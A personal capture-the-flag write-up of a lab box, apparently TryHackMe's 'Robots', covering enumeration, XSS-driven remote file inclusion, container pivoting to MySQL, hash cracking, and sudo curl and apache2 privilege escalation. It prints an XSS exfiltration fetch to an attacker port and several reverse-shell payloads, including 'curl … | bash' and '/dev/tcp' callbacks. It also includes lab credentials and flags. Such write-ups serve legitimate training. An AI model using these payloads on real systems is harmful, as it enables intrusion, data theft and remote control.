---
Status: "#Complete"
OS:
ip:
Start_Time: 2026-01-31 12:12
---

## 🔍 2. Information Gathering & Enumeration

### 2.1 Service Scanning
	The assessment began with a quick, full ports scan. The result shows that there are three open ports which are 22,80 and 9000. Following the result, I start a deeper scan which target the port 9000. It returns that the service running on port 9000 is cslistener. However, it may need furthur verification.
```bash
# Nmap Full Scan
nmap -Pn -p- --min-rate 1000 -oN nmap_full <target ip>
```

![](<assets/Pasted image 20260131124103.png>)
![](<assets/Pasted image 20260131124113.png>)
![](<assets/Pasted image 20260131124122.png>)
	Curl result shows that the target is running a normal website. 

![](<assets/Pasted image 20260131132852.png>)
	Next, I used gobuster for a complete directory enumeration. And dirsearch for a deeper enumeration.
	Gobuster reviews a valuable information, which is robots.txt. The content shows that there are three highly sensitive, possible directories. However, it returns state code 403, which means we don't have permission.
![](<assets/Pasted image 20260131134354.png>)
![](<assets/Pasted image 20260131135037.png>)
	![](<assets/Pasted image 20260131134900.png>)
	Following the result, I keep doing directory enumeration to the directories in robots.txt.
	![](<assets/Pasted image 20260131135307.png>)
	![](<assets/Pasted image 20260131135318.png>)
	![](<assets/Pasted image 20260131135333.png>)
---
	The results shows that most of the files are returned 403 state code. And I find that two directories have .gitkeep file, which means part of the files may be saved in git repo. There might be potential attack surface.
	And I found a really strange thing, which is no matter the url is, if I tried to access the directories through port 9000, all will return 404 not exist. However, the directory enumeration results shows that instead of 404 code, if I don't access it through port 9000, it will return 403 code not 404.
	The next find is when I tried to visit these possible directories, I noticed that the target ip address was automatically changed to robots.thm and returned "can't connect to server"
```
http://10.80.139.181/harm/to/self/index.php
http://10.80.139.181/harm/to/self/.git/config
```
	This is a really interesting finding. I modified the local host files and tried to visit the target.

![](<assets/Pasted image 20260131141347.png>)
This is a really nice finding. This means I have a possible attack surface.
So I did another directory enumeration by dirsearch to verify whether there were some other files or not.
![](<assets/Pasted image 20260131142223.png>)
The result was clear, now I have access to several files.


##  3. Initial access
### 3.1 Registration
	The register field is using a weak password, it lists the logic of the possible password. So I first register an account and to see the content of the website.

![](<assets/Pasted image 20260131142757.png>)
![](<assets/Pasted image 20260131190211.png>)
	The content shows that we are the fourth user here, and admin has just login. And there is a server info on the top left, which contains many configuration of the target. The php info contains valuable information. The following images shows that the target has url include open and file upload open, which means I can try to include the payload in username when registration. (The hint on website said that the admin is monitoring us)

![](<assets/Pasted image 20260131190350.png>)
![](<assets/Pasted image 20260201110943.png>)
![](<assets/Pasted image 20260201111007.png>)
#### 3.2 Reverse shell (RFI)
	I want to use exploit.js to visit the admin.php and see the source code of admin.php. With the skill of cross site script, I successfully get the response.
```
	<script src="http://.../exploit.js"></script>	
```
```bash
# visit admin.php
fetch('/harm/to/self/admin.php')
  .then(response => response.text())
  .then(data => {
    fetch('http://IP:8888/?content=' + btoa(data));
  });
```
	The source code is encoded by base64, so I decode it and find that there is something special. The input type is text and the name="url" means the admin may be keep putting the url into this input place and execute it. The admin will post the request and include the url.
	This means we can try to include the reverse shell in the exploit.js.
```
var payload = "data://text/plain;base64,PD9waHAgc3lzdGVtKCJiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTcyLjIyNy80NDQ0IDA+JjEiKTsgPz4="; 

fetch('/harm/to/self/admin.php', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'url=' + encodeURIComponent(payload)
});
```
	However, it didn't trigger the callback. I think this may because there may some limit in the backend such as length limit. So I tried to use a second order XSS attack, which means in body part I will inject another XSS url and retrieve the script here and execute it.
	Rewrite the exploit.js and create a new script called reverse
```
	#exploit.js
	fetch('/harm/to/self/admin.php', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    },
    credentials:'include',   
    body: 'url=http://ip:7000/reverse.php' 
});
	
```
	The exlploit.js will retrieve the reverse.php
```
	#reverse.php
	<?php system('curl -s http://ip:9000/shell.sh | bash') ?>

```
	Next, reverse.php will retrieve shell.sh, which will call back to our machine.
```
#shell.sh
#!/bin/bash
bash -i >& /dev/tcp/ip/4444 0>&1

```
	Now we have a reverse shell.
	
![](<assets/Pasted image 20260201151300.png>)
##  4. Privilege Escalation

### 4.1 Escape container
	After I have the shell, I tried to use ifconfig command to list the state of network. However, I failed and it returned no such commands. Now I remembered when I read the phpinfo of the target server, it said the server is running inside a docker. The lack of ifconfig and ip cmd verify this.
	The following cmd and picture verified that this is a docker.

![](<assets/Pasted image 20260201222635.png>)
![](<assets/Pasted image 20260201222650.png>)
	The pid=1 and .dockerenv verifies that this is a docker.
	When I view the contents under /harm/to/self directories, I found that in config.php there is a database credential.

![](<assets/Pasted image 20260201224247.png>)
```
Username:robots
password: q4qCz1OflKvKwK4S
dbname=web
servername=db
```
	By checking the target environment, I found that target has mysqlnd,PDO, and sqlite3. However, the sql connection is not opened. But when I checked the /etc/hosts file, I found that there is an internal ip address. I tried to scan it for all possible subnets.
	

![](<assets/Pasted image 20260202130236.png>)
![](<assets/Pasted image 20260202134211.png>)
	The scan result shows that for this internal ip address, port 3306 is opened.

![](<assets/Pasted image 20260202150451.png>)
```
for i in $(seq 1 10); do
  ip="172.18.0.$i"
  timeout 1 bash -c "echo > /dev/tcp/$ip/3306" 2>/dev/null \
    && echo "[+] $ip :3306 MySQL open"
done
```
	However, I cannot access the target database through the container. The target database is in the internal. The contents of register.php also reveals that there is PDO exists. So I think I can try to access the database through PHP.
	
![](<assets/Pasted image 20260202223051.png>)
	So I write a script to use php to visit target website and use curl to get the script from kali to /tmp.

![](<assets/Pasted image 20260202225133.png>)
	The script content is below.
```
	<?php try { 
			$conn = new PDO('mysql:host=db;dbname=web', 'robots', 'q4qCz10flKvKwK4S');
			$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
			$result = $conn->query('SHOW TABLES'); 
			while ($row = $result->fetch(PDO::FETCH_NUM)) { 
			echo "- " . $row[0] . "\n"; } } 
			catch (PDOException $e) { 
			echo "Error: " . $e->getMessage(); 
			} ?>
```
	Now I have access to the database, the result of tables are listed below.

![](<assets/Pasted image 20260202231042.png>)
	Now we can modify the content of db.php to access these tables and related contents.
	And I have retrieve the credentials.

![](<assets/Pasted image 20260202232955.png>)

| **ID** | Username     | Password Hash                      | Group   | cleartext |
| ------ | ------------ | ---------------------------------- | ------- | --------- |
| `1`    | **admin**    | `3e3d6c2d540d49b1a11cf74ac5a37233` | admin   |           |
| `2`    | **rgiskard** | `dfb35334bf2a1338fa40e5fbb4ae4753` | nologin |           |
	At first time, I used hashcat to crack it. However, no results. I remembered the rule of password is md5(username+DDMM), but I get no result. So I guessed may be it is doubled hash, which is md5(md5(username+DDMM)). And it is correct, it is double hash.

![](<assets/Pasted image 20260203000624.png>)
	We have the password of rgiskard. Now I can have his real password through (md5(username+DDMM)).

![](<assets/Pasted image 20260203000944.png>)
	Now I have access to rgiskard through ssh.
	
### 4.2 Local Enumeration
*Record findings from automated scripts and manual environment checks.*
- [ ] **Automated Tool:** Run [[PEASS-ng]] (winPEAS.exe / linpeas.sh).
- [ ] **Kernel Version:** `systeminfo` (Windows) or `uname -a` (Linux).
- [ ] **Sensitive Files:** Check for `.txt`, `.pdf`, `.zip` in user folders or web roots.
- [ ] **Misconfigurations:** (e.g., SUID, Sudo -l, Unquoted Service Paths, Token Impersonation).

### 4.2 Escalation Path(curl)
	By using sudo -l, I found that rgiskard has access to run curl as dolivow, which means I can use curl to visit dolivow's file.

![](<assets/Pasted image 20260203091541.png>)
	I tried to use this command to access the flag and it success. This means we can keep using this to access more snesitive files.

![](<assets/Pasted image 20260203091952.png>)
	Next, I tried to access /etc/passwd and it returned the results. And then I want to access the dolivaw's private key, the directory exists. However, I tried many file name but nothing returned. So I changed my mind, if I have fully access to curl command, what if I use curl to write my public key into dolivaw's /.ssh directory?
	So I generate my public key first and use curl to write it into dolivaw's directory.

![](<assets/Pasted image 20260203094653.png>)
	This command successfully write my public key into target directory.
	Now, let's ssh.

![](<assets/Pasted image 20260203095906.png>)
	Success.
### 4.3 Apache2 error return
	By using sudo -l, I found that user dolivaw is able to run the commad /usr/sbin/apache2. This is a possible privilege escalate path. We can use apache2's error returned to read the flag contents.

![](<assets/Pasted image 20260203100540.png>)
	I used the command -f to force the apache2 to return the error message to me.

![](<assets/Pasted image 20260203100625.png>)
	However, it returned no MPM loaded. So I use -C to loaded the MPM module by myself.

![](<assets/Pasted image 20260203100720.png>)
	This time it succeed. The root.txt flag is returned.
---


---

##  6. Proof of Possession (Flags)
> [!DANGER] CRITICAL FOR OSCP
> The screenshot MUST contain: `whoami`, `ipconfig / ifconfig`, and the `flag` content in ONE terminal window.

| Flag Type    | Flag Content (Hash)                   | Screenshot (Link)                           |
| :----------- | :------------------------------------ | :------------------------------------------ |
| **user.txt** | THM{9b17d3c3e86c944c868c57b5a7fa07d8} | ![](<assets/Pasted image 20260203092218.png>) |
| **root.txt** | THM{2a279561f5eea907f7617df3982cee24} | ![](<assets/Pasted image 20260203100825.png>) |

---

